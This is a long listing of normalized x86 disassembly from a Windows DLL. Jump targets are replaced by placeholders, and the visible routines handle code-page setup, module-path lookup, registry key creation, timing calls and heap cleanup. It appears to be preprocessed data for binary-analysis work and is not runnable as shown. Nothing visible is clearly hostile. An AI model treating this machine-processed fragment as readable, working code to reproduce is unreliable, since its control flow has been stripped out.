mov esi [ esi + 0x4 ]
test esi esi
jne r-xdata
sub_1000fdc0
push ebp
mov ebp esp
sub esp 0x41c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x41c ] eax
test edi edi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_1004c3b6
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
test ebx ebx
je r-xdata
test esi esi
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
test [ ebp + 0x10 ] 0x4
jne r-xdata
pop esi
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
push ecx
push eax
mov ecx edi
call sub_10013c90
add esp 0x8
test eax eax
je r-xdata
pop esi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx [ rw-data ]
push 0x104
lea eax [ ebp - 0x20c ]
push eax
push ecx
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
pop esi
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x20c ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ ebp - 0x20c ]
push eax
call [ PathAddBackslashW@IAT ]
mov ecx [ rw-data ]
cmp [ ecx + 0xd54 ] 0x0
mov [ ebp - 0x418 ] esi
jne r-xdata
pop esi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x414 ]
lea esi [ ebp - 0x20c ]
mov ecx eax
xor ebx ebx
mov edx 0x104
sub esi ecx
lea esp [ esp ]
mov [ ebp - 0x418 ] ebx
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test ebx ebx
je r-xdata
sub eax 0x2
mov ebx 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
mov eax [ ebp - 0x418 ]
push eax
mov esi 0x104
lea ebx [ ebp - 0x414 ]
call sub_10030af0
test eax eax
je r-xdata
pop esi
lea eax [ edx + 0x6 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x41c ]
lea edx [ ebp - 0x414 ]
push edx
mov edx edi
call sub_1005ea40
add esp 0x8
neg eax
sbb eax eax
pop esi
and eax 0x8
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
pop esi
mov eax 0x7
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
sub_1000ffe0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x3fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10052185
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_1002050e
lea eax [ ecx * 4 ]
push eax
call sub_1005ac7e
add esp 0x4
test eax eax
jne r-xdata
sub_10010040
mov eax [ esi + 0x4 ]
dec [ eax ]
jne r-xdata
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x4 ]
mov [ esi ] 0x0
test eax eax
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x4 ] 0x0
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_1001007a
mov edi edi
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4c ] esi
mov [ ebp - 0x48 ] ebx
cmp [ esi + 0x14 ] ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ esi + 0xc0 ] ebx
mov [ esi + 0xc4 ] ebx
mov [ esi + 0xc8 ] r--data
mov [ esi + 0xcc ] r--data
mov [ esi + 0xd0 ] r--data
mov [ esi + 0xac ] 0x1
xor eax eax
push eax
call [ InterlockedDecrement@IAT ]
push 0x4
call sub_10028397
push 0x2
mov edi 0x180
push edi
mov [ ebp - 0x2c ] eax
call sub_10025450
push 0x1
push edi
mov [ ebp - 0x1c ] eax
call sub_10025450
push 0x1
push edi
mov [ ebp - 0x20 ] eax
call sub_10025450
push 0x1
push 0x101
mov [ ebp - 0x28 ] eax
call sub_10025450
add esp 0x24
mov [ ebp - 0x24 ] eax
cmp [ ebp - 0x2c ] ebx
je r-xdata
push eax
movzx eax [ esi + 0x30 ]
push 0x1004
push eax
lea eax [ ebp - 0x4c ]
push ebx
push eax
call sub_1002f2f7
add esp 0x14
test eax eax
jne r-xdata
push [ ebp - 0x2c ]
call sub_10020a90
push [ ebp - 0x1c ]
call sub_10020a90
push [ ebp - 0x20 ]
call sub_10020a90
push [ ebp - 0x28 ]
call sub_10020a90
xor ebx ebx
add esp 0x10
inc ebx
jmp r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push [ ebp - 0x24 ]
call sub_10020a90
pop ecx
mov eax ebx
jmp r-xdata
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1004c3b6
leave
retn
cmp [ ebp - 0x20 ] ebx
je r-xdata
cmp [ ebp - 0x28 ] ebx
je r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] ebx
xor eax eax
mov ecx [ ebp - 0x24 ]
mov [ eax + ecx ] al
inc eax
cmp eax 0x100
jl r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x18 ] 0x5
ja r-xdata
movzx eax [ ebp - 0x18 ]
mov [ ebp - 0x30 ] eax
cmp eax 0x1
jle r-xdata
mov eax [ ebp - 0x1c ]
push ebx
push ebx
push [ esi + 0x4 ]
add eax 0x100
push eax
push 0x100
push [ ebp - 0x24 ]
mov [ ebp - 0x40 ] eax
push 0x1
push ebx
call sub_10058442
add esp 0x20
test eax eax
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x24 ]
push ebx
push [ esi + 0x4 ]
mov edi 0xff
push edi
add ecx 0x81
push ecx
push edi
inc eax
push eax
push 0x100
push [ esi + 0x14 ]
push ebx
call sub_1000a03a
add esp 0x24
test eax eax
je r-xdata
lea eax [ ebp - 0x11 ]
mov eax [ ebp - 0x28 ]
push ebx
push [ esi + 0x4 ]
add eax 0x81
push edi
push eax
mov eax [ ebp - 0x24 ]
push edi
inc eax
push eax
push 0x200
push [ esi + 0x14 ]
push ebx
call sub_1000a03a
add esp 0x24
test eax eax
je r-xdata
movzx edi [ eax - 0x1 ]
movzx ecx cl
jmp r-xdata
mov eax [ ebp - 0x1c ]
mov edi [ ebp - 0x20 ]
lea ecx [ eax + 0xfe ]
xor edx edx
cmp [ ebp - 0x30 ] 0x1
mov [ ecx ] dx
mov edx [ ebp - 0x28 ]
mov [ ebp - 0x3c ] ecx
lea ecx [ edi + 0x80 ]
mov [ edi + 0x7f ] bl
mov [ edx + 0x7f ] bl
mov [ ecx ] bl
mov [ ebp - 0x44 ] ecx
lea ecx [ edx + 0x80 ]
mov [ ebp - 0x38 ] ecx
mov [ ecx ] bl
jle r-xdata
cmp edi ecx
jle r-xdata
push 0xfe
lea ecx [ eax + 0x200 ]
push ecx
push eax
call sub_10078600
push 0x7f
lea eax [ edi + 0x100 ]
push eax
push edi
call sub_10078600
mov eax [ ebp - 0x28 ]
push 0x7f
lea ecx [ eax + 0x100 ]
push ecx
push eax
call sub_10078600
mov eax [ esi + 0xc0 ]
add esp 0x24
cmp eax ebx
je r-xdata
cmp [ ebp - 0x12 ] bl
je r-xdata
mov ecx [ ebp - 0x24 ]
mov [ edi + ecx ] 0x20
movzx ecx [ eax ]
inc edi
add eax 0x2
cmp [ eax - 0x1 ] bl
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] 0x1
mov [ esi + 0xc0 ] eax
mov eax [ ebp - 0x40 ]
mov [ esi + 0xc8 ] eax
mov eax [ ebp - 0x3c ]
mov [ esi + 0xc4 ] eax
mov eax [ ebp - 0x44 ]
mov [ esi + 0xcc ] eax
mov eax [ ebp - 0x38 ]
mov [ esi + 0xd0 ] eax
mov eax [ ebp - 0x30 ]
mov [ esi + 0xac ] eax
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
lea ecx [ ebp - 0x11 ]
mov [ ebp - 0x1c ] ecx
mov cl [ eax ]
cmp cl bl
je r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10020a90
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10020a90
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10020a90
push [ esi + 0xc0 ]
call sub_10020a90
add esp 0x10
movzx ecx [ ecx - 0x1 ]
movzx edx dl
mov [ ebp - 0x20 ] ecx
cmp ecx edx
jg r-xdata
mov ecx [ ebp - 0x1c ]
add ecx 0x2
mov [ ebp - 0x1c ] ecx
cmp [ ecx - 0x1 ] bl
jne r-xdata
lea ecx [ eax + ecx * 2 + 0x100 ]
jmp r-xdata
mov dl [ ecx ]
cmp dl bl
je r-xdata
inc [ ebp - 0x20 ]
mov edx 0x8000
mov [ ecx ] dx
add ecx 0x2
mov [ ebp - 0x34 ] ecx
mov ecx [ ebp - 0x1c ]
movzx ecx [ ecx ]
cmp [ ebp - 0x20 ] ecx
jle r-xdata
mov ecx [ ebp - 0x34 ]
sub_10010421
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_1001e222
call sub_1001e222
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_100104a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fd00
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_100616c6
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edi [ esi + 0xc ]
push ebx
mov ecx edi
call sub_1002a4b0
mov [ ebp - 0x4 ] 0x0
mov ebx [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
push ebx
push 0x0
push edi
push eax
push ecx
push edx
mov [ ebp - 0x14 ] eax
call sub_1005d4a0
mov ebx [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov edi edx
shr edi 0x1f
add esp 0x18
add edi edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 4 ]
lea ecx [ edi * 8 ]
sub ecx edi
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 4 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
push ecx
lea eax [ esi + 0xc ]
push eax
mov eax [ esi + 0x4 ]
push eax
push ebx
call sub_1000c130
mov edx [ esi ]
push edx
call sub_10065045
add esp 0x14
sub_100105c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1008212b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
xor edi edi
xor edx edx
mov [ ebp - 0x70 ] 0x7
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x84 ] dx
push ecx
mov ecx [ ebp + 0xc ]
push eax
lea edx [ ebp - 0x84 ]
mov [ ebp - 0x4 ] edi
call sub_1004eb30
test eax eax
je r-xdata
cmp [ ebp - 0x74 ] edi
jne r-xdata
lea edx [ ebp - 0x60 ]
mov eax 0xa9
call sub_1001bb80
cmp [ ebp - 0x70 ] 0x8
jb r-xdata
push esi
lea edi [ ebp - 0x84 ]
call sub_10027540
test eax eax
je r-xdata
lea edx [ ebp - 0x40 ]
mov eax 0x1f
call sub_1001bb80
cmp [ ebp - 0x70 ] 0x8
jb r-xdata
mov eax 0x1
jmp r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_10065045
add esp 0x4
cmp [ ebp - 0x70 ] 0x8
jb r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x79
call sub_1001bb80
cmp [ ebp - 0x70 ] 0x8
jb r-xdata
mov eax 0x2
jmp r-xdata
mov ecx [ ebp - 0x84 ]
push ecx
call sub_10065045
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x8
xor eax eax
mov eax [ ebp - 0x84 ]
push eax
call sub_10065045
add esp 0x4
mov eax 0x3
jmp r-xdata
mov edx [ ebp - 0x84 ]
push edx
call sub_10065045
add esp 0x4
sub_100106db
mov edi edi
push ebp
mov ebp esp
mov edx [ ecx + 0x10 ]
mov eax [ ebp + 0x8 ]
cmp eax edx
ja r-xdata
push [ ebp + 0xc ]
sub eax edx
push eax
call sub_10021a98
push 0xffffffff
push eax
call sub_1001a5e2
jmp r-xdata
pop ebp
retn 0x8
sub_10010710
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
test eax eax
jne r-xdata
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push 0x0
push 0x20106
push 0x0
push 0x0
push 0x0
push eax
push edx
call [ RegCreateKeyExW@IAT ]
test eax eax
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn
push esi
call [ lstrlenW@IAT ]
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
lea eax [ eax + eax + 0x2 ]
push eax
mov eax [ ebp + 0xc ]
push esi
push eax
push 0x0
push ecx
push edx
call [ RegSetValueExW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax 0x2
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
push eax
call [ RegCloseKey@IAT ]
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov esi 0x3
sub_10010790
push ebp
mov ebp esp
push 0xffffffff
push sub_1008232b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1cc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0xb4 ] 0x10
mov eax [ ebp + 0xc ]
mov edi [ ebx + 0xb0 ]
lea esi [ ebx + 0xa0 ]
mov [ ebp - 0x1d0 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x1cc ] eax
mov [ ebp - 0x1a4 ] ebx
mov [ ebp - 0x1a0 ] ecx
mov [ ebp - 0x1c0 ] edx
mov [ ebp - 0x1d4 ] esi
mov eax edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
sete al
test al al
je r-xdata
test edi edi
setne al
test eax eax
push 0x0
push r--data
push eax
call sub_10068a30
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax 0x44
jmp r-xdata
mov eax [ ebp - 0x1a0 ]
test eax eax
sete [ ebp - 0x1ad ]
test eax eax
jne r-xdata
mov eax 0x45
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn 0x10
lea edx [ ebp - 0x6c ]
mov eax 0x1e
mov [ ebp - 0x1ac ] 0x0
call sub_100328b0
xor edi edi
xor edx edx
lea eax [ ebp - 0x6c ]
mov [ ebp - 0x148 ] dx
mov [ ebp - 0x134 ] 0x7
mov [ ebp - 0x138 ] edi
lea edx [ eax + 0x2 ]
lea ecx [ ecx ]
lea ecx [ ebp - 0x1a0 ]
push ecx
call sub_1000b569
add esp 0x4
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x6c ]
push eax
lea ecx [ ebp - 0x148 ]
call sub_1005e3c0
lea ecx [ ebp - 0x148 ]
push ecx
mov [ ebp - 0x4 ] edi
mov edx [ ebp - 0x1a0 ]
push edx
mov edx [ ebp - 0x1c0 ]
push ebx
xor ecx ecx
call sub_1001add0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x134 ] 0x8
jb r-xdata
mov [ ebp - 0x1a8 ] edi
mov [ ebp - 0x1b4 ] edi
mov edi ebx
call sub_10036490
mov [ ebp - 0x1b8 ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x148 ]
push eax
call sub_10065045
add esp 0x4
lea edx [ ebp - 0xb8 ]
mov eax 0x4b
call sub_100328b0
mov eax edx
push eax
lea ecx [ ebp - 0x12c ]
call sub_1004a800
lea ecx [ ebp - 0x12c ]
push ecx
mov ecx [ ebp - 0x1ac ]
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x1a0 ]
push edx
mov edx [ ebp - 0x1c0 ]
push ebx
call sub_1001add0
lea ecx [ ebp - 0x12c ]
call sub_10035d10
mov eax 0x43
jmp r-xdata
jmp r-xdata
mov eax [ ebp - 0x1d0 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb8 ]
mov eax 0x1a
call sub_100328b0
mov eax edx
push eax
lea ecx [ ebp - 0x12c ]
call sub_1004a800
mov [ ebp - 0x4 ] 0x2
mov edx [ ebp - 0x1a0 ]
lea ecx [ ebp - 0x12c ]
push ecx
mov ecx [ ebp - 0x1ac ]
push edx
mov edx [ ebp - 0x1a8 ]
push ebx
call sub_1001add0
lea ecx [ ebp - 0x12c ]
call sub_10035d10
mov eax 0x1
jmp r-xdata
mov edi [ ebp + 0x10 ]
lea ecx [ ebp - 0x1b4 ]
push ecx
lea ecx [ ebp - 0x1a8 ]
mov ebx eax
call sub_100163c0
test eax eax
jne r-xdata
mov ebx [ ebp - 0x1a4 ]
mov edx [ ebp - 0x1b8 ]
call sub_10017130
mov edx [ ebp - 0x1cc ]
mov ecx [ ebp - 0x1c0 ]
push edx
mov edx [ ebp - 0x1a0 ]
push ecx
mov ecx [ ebp - 0x1b4 ]
push edx
push eax
mov eax [ ebp - 0x1a8 ]
push eax
push ecx
call sub_1002ae60
push esi
lea ecx [ ebp - 0x164 ]
mov edi eax
call sub_100408f0
push edi
lea esi [ ebp - 0x180 ]
mov [ ebp - 0x4 ] 0x3
call sub_10059250
mov edx esi
push edx
lea eax [ ebp - 0x164 ]
push eax
lea ecx [ ebp - 0x19c ]
push ecx
mov [ ebp - 0x4 ] 0x4
call sub_10064e20
add esp 0xc
lea edx [ ebp - 0x48 ]
mov eax 0x39
mov [ ebp - 0x4 ] 0x5
call sub_100328b0
mov ecx [ edi + 0x54 ]
sub ecx [ edi + 0x50 ]
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
xor ebx ebx
add eax edx
je r-xdata
cmp [ ebp - 0x1ad ] 0x0
je r-xdata
xor esi esi
lea esp [ esp ]
mov eax [ ebp - 0x1b4 ]
test eax eax
je r-xdata
mov esi [ ebp - 0x1b8 ]
lea ecx [ ebp - 0x164 ]
push ecx
lea ecx [ ebp - 0x180 ]
mov edx esi
call sub_1003a850
cmp eax 0x42
je r-xdata
mov edx [ ebp - 0x1a4 ]
fnstcw [ ebp - 0x1ba ]
movzx eax [ ebp - 0x1ba ]
fmul [ edx + 0x114 ]
or eax 0xc00
mov [ ebp - 0x1c4 ] eax
fldcw [ ebp - 0x1c4 ]
fistp [ ebp - 0x1c8 ]
mov eax [ ebp - 0x1c8 ]
push eax
fldcw [ ebp - 0x1ba ]
call [ Sleep@IAT ]
mov eax [ ebp - 0x1d8 ]
cmp eax 0x42
je r-xdata
fadd [ r--data ]
test edi edi
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0xd4 ] 0x0
test eax eax
je r-xdata
cmp eax 0x43
jne r-xdata
mov eax [ ebp - 0x1b4 ]
mov edx [ ebp - 0x1b8 ]
mov [ edx + 0xd4 ] 0x0
test eax eax
je r-xdata
cmp eax 0x43
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax 0x68
call sub_100328b0
mov eax edx
push eax
lea ecx [ ebp - 0x30 ]
call sub_1004a800
mov eax [ ebp - 0x1a4 ]
mov [ ebp - 0x4 ] 0x9
mov edx [ ebp - 0x1a0 ]
lea ecx [ ebp - 0x30 ]
push ecx
mov ecx [ ebp - 0x1ac ]
push edx
mov edx [ ebp - 0x1a8 ]
push eax
call sub_1001add0
lea ecx [ ebp - 0x30 ]
call sub_10035d10
lea ecx [ ebp - 0x19c ]
call sub_10021250
lea ecx [ ebp - 0x180 ]
call sub_10021250
lea ecx [ ebp - 0x164 ]
call sub_10021250
xor eax eax
mov eax edi
call sub_10012e70
mov eax edi
call sub_10012e70
lea edx [ ebp - 0xe8 ]
mov eax 0x8
call sub_100328b0
push edx
lea ecx [ ebp - 0x12c ]
call sub_1004a800
mov edx [ ebp - 0x1a4 ]
lea eax [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x8
mov ecx [ ebp - 0x1a0 ]
push eax
push ecx
push edx
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
lea edx [ ebp - 0x34 ]
mov eax 0x1
call sub_100328b0
mov eax edi
call sub_10012e70
lea edx [ ebp - 0xd8 ]
mov eax 0x18
call sub_100328b0
mov eax edx
push eax
lea ecx [ ebp - 0x12c ]
call sub_1004a800
mov eax [ ebp - 0x1a4 ]
lea ecx [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x7
mov edx [ ebp - 0x1a0 ]
push ecx
push edx
push eax
jmp r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov ecx [ edi + 0x50 ]
mov edx [ esi + ecx + 0x24 ]
add [ ebp - 0x1ac ] edx
lea edx [ ebp - 0x140 ]
mov eax 0x63
call sub_100328b0
mov eax edx
push eax
lea ecx [ ebp - 0x12c ]
call sub_1004a800
mov eax [ ebp - 0x1a4 ]
mov [ ebp - 0x4 ] 0x6
mov edx [ ebp - 0x1a0 ]
lea ecx [ ebp - 0x12c ]
push ecx
mov ecx [ ebp - 0x1ac ]
push edx
mov edx [ ebp - 0x1a8 ]
push eax
call sub_1001add0
lea ecx [ ebp - 0x12c ]
mov [ ebp - 0x4 ] 0x5
call sub_10035d10
mov ecx [ edi + 0x54 ]
sub ecx [ edi + 0x50 ]
mov eax 0x88888889
imul ecx
add edx ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
inc ebx
add ecx edx
add esi 0x3c
cmp ebx ecx
jb r-xdata
mov esi [ ebp - 0x1d4 ]
mov edx [ ebp - 0x1a8 ]
mov ecx [ ebp - 0x1ac ]
call sub_1001add0
lea ecx [ ebp - 0x12c ]
call sub_10035d10
lea ecx [ ebp - 0x19c ]
call sub_10021250
lea ecx [ ebp - 0x180 ]
call sub_10021250
lea ecx [ ebp - 0x164 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10021250
mov edi [ ebp - 0x1a4 ]
xor esi esi
mov [ ebp - 0x1b4 ] esi
mov [ ebp - 0x1a8 ] esi
call sub_10036490
mov [ ebp - 0x1b8 ] eax
mov ebx edi
cmp eax esi
jne r-xdata
call [ GetTickCount@IAT ]
mov edx [ edi + 0x50 ]
lea ecx [ ebp - 0x19c ]
push ecx
mov ecx [ ebp - 0x1b8 ]
add edx esi
mov [ ebp - 0x1bc ] eax
call sub_10001470
mov [ ebp - 0x1d8 ] eax
call [ GetTickCount@IAT ]
sub eax [ ebp - 0x1bc ]
mov [ ebp - 0x1c4 ] eax
fild [ ebp - 0x1c4 ]
jns r-xdata
sub_10010e0d
push 0x64
mov eax sub_1007e708
call sub_10007703
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi [ ebp + 0x10 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x1c ]
push eax
call sub_10064bde
mov ebx eax
pop ecx
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
call sub_1002a674
xor eax eax
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x38 ] eax
je r-xdata
add edi 0x8
push edi
push 0x0
push 0x30
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x60 ] edi
call sub_1005e05a
add esp 0xc
push [ ebp - 0x5c ]
movzx ebx ax
mov eax [ ebp - 0x64 ]
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_10060ea7
test al al
jne r-xdata
mov eax [ ebx ]
mov ecx ebx
call [ eax + 0x8 ]
movzx eax ax
mov eax [ ebp + 0x18 ]
and eax 0xe00
cmp eax 0x400
jne r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
cmp eax 0x800
jne r-xdata
mov [ ebp - 0x50 ] 0x8
jmp r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2b
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
neg eax
sbb eax eax
and eax 0xa
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x50 ] 0x10
jmp r-xdata
push [ ebp - 0x5c ]
mov ecx esi
mov [ ebp - 0x58 ] 0x0
mov [ ebp - 0x49 ] 0x0
call sub_10060ea7
test al al
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2b
jmp r-xdata
xor ebx ebx
cmp [ ebp - 0x50 ] ebx
je r-xdata
cmp [ esi + 0x4 ] al
jne r-xdata
push [ ebp - 0x60 ]
movzx edi [ esi + 0x6 ]
push 0x0
push 0x2d
call sub_1005e05a
add esp 0xc
cmp di ax
jne r-xdata
mov ecx esi
call sub_1001e1bc
inc eax
mov ecx esi
mov [ ebp - 0x54 ] eax
call sub_1001e1ec
mov [ ebp - 0x6c ] 0xa
cmp [ ebp - 0x50 ] 0xa
je r-xdata
movzx eax [ esi + 0x6 ]
cmp ax bx
jne r-xdata
mov ecx esi
call sub_1001e1bc
mov eax [ ebp - 0x64 ]
mov [ eax ] 0x2d
cmp [ ebp - 0x34 ] 0x10
mov edx [ ebp - 0x48 ]
jae r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
xor eax eax
cmp [ ebp - 0x50 ] 0x8
setne al
dec eax
and eax 0xfffffff2
add eax 0x16
mov [ ebp - 0x6c ] eax
jmp r-xdata
mov ecx esi
mov [ ebp - 0x58 ] 0x1
call sub_1001e1ec
push [ ebp - 0x5c ]
mov ecx esi
call sub_10060ea7
test al al
jne r-xdata
